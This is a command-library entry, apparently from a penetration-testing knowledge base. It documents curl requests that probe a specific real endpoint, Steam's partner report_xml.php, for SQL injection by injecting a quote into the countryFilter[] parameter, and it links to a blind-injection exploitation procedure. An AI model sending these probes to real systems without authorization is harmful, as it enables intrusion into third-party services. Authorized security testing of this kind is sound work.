---
data: >-
  curl -X POST 'https://partner.steamgames.com/report_xml.php' -H 'Cookie:
  session=your_session' -H 'Content-Type: application/x-www-form-urlencoded' -d
  'countryFilter[]=US\'&reportType=1'
tags:
  - sqli
  - testing
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:10.249Z'
id: 7d6b331e-051c-4260-8d51-2cd7faeb3c99
verified: false
validated: true
submitted: true
---
# curl-test-sqli

## Command

```bash
curl -X POST 'https://partner.steamgames.com/report_xml.php' -H 'Cookie: session=your_session' -H 'Content-Type: application/x-www-form-urlencoded' -d 'countryFilter[]=US\'&reportType=1'
```

## Description

This command tests for SQL injection by appending a single quote to the countryFilter[] parameter, potentially triggering a syntax error or behavioral change in the response.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies POST method | Yes |
| `-H 'Cookie: ...'` | Provides session authentication | Yes |
| `-d 'countryFilter[]=US\''` | Injects payload in parameter | Yes |
| `reportType=1` | Additional required parameter | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://partner.steamgames.com/report_xml.php' -H 'Content-Type: application/x-www-form-urlencoded' -d 'countryFilter[]=US'
```

### Advanced Usage

```bash
curl -X POST 'https://partner.steamgames.com/report_xml.php' -H 'Cookie: session=abc123' -d 'countryFilter[]=US\' -v
```

## Expected Output

HTTP response with XML content; look for errors, empty responses, or anomalies compared to a non-injected request.

## Related

- [[commands/curl-boolean-sqli]]
- [[procedures/Exploiting-Blind-SQL-Injection-in-Country-Filter]]
